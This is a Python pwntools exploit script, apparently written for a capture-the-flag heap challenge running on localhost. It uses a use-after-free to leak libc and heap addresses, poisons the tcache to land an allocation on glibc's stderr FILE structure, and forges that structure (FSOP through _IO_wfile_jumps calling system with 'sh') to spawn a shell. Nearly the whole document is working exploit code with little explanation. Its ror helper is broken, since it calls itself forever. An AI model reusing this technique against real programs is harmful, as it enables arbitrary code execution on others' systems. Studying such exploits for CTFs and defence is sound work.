#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 4000

# dont forget to: patchelf --set-interpreter /tmp/ld-2.27.so ./test
# dont forget to set conext.arch. E.g amd64

from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './chal_patched'
#context.terminal = ['tmux', 'new-window']
context.terminal = ["tmux", "splitw", "-hb"]
argv = []
#env = {'LD_PRELOAD':'./libc.so.6'}
env = {}
libc = ELF('./libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# storage_addr = address of fd pointer of chunk
# target = target of fd pointer
def mask(storage_addr, target):
    return target ^ (storage_addr >> 12)

def wait():
    input("waiting")

def rol(x, shift, bits=64):
	return ((x << shift) | (x >> (bits-shift))) % (1<<bits)

def ror(x, shift, bits=64):
	return ror(x, bits-shift, bits=bits)

def alloc(idx, sz, data):
     io.sendlineafter(">", str(1).encode())
     io.sendlineafter("idx", str(idx).encode())
     io.sendlineafter("size", str(sz).encode())
     io.sendafter(b"data", data)

def free(idx):
     io.sendlineafter(">", str(3).encode())
     io.sendlineafter("idx", str(idx).encode())

def view(idx):
     io.sendlineafter(">", str(2).encode())
     io.sendlineafter("idx", str(idx).encode())

def edit(idx, data):
     io.sendlineafter(">", str(4).encode())
     io.sendlineafter("idx", str(idx).encode())
     io.sendafter("data", data)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# pwndbg tele command
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start(argv, env=env)

alloc(0, 0x480, b"A"*0x8)

alloc(1, 0xf8, b"B"*0x8)
free(0)
view(0)

io.recvuntil(b"meow: ")
libc.address = u64(io.recv(6).ljust(8, b"\x00")) - 0x211b20
log.info(f"Libc leak: {hex(libc.address)}")

free(1)

view(1)
io.recvuntil(b"meow: ")
heap = u64(io.recv(6).ljust(8, b"\x00")) << 12
log.info(f"Heap base {hex(heap)}")

stderr = libc.sym['_IO_2_1_stderr_']
edit(1, p64(stderr ^ (heap >> 12)))

log.info(f"Stderr: {hex(stderr)}")

alloc(1, 0xf8, b"aaaa")

def fsrop(fp=libc.sym._IO_2_1_stderr_, offset=0):
    fs = FileStructure(0)
    fs.flags = u64(b' sh\0\0\0\0\0')
    fs._IO_write_ptr = 1 # need to be greater than _IO_write_base
    fs._lock = libc.address + 0x213780
    fs._wide_data = fp - 0x10
    fs.unknown2 = p64(0)*4 + p64(libc.sym.system) + p64(fp + 0x60)
    fs.vtable = libc.sym._IO_wfile_jumps + offset
    # print(bytes(fs).hex())
    return bytes(fs)

fake = fsrop()

alloc(1, 0xf8, fake)

io.sendline(str(69).encode())

io.interactive()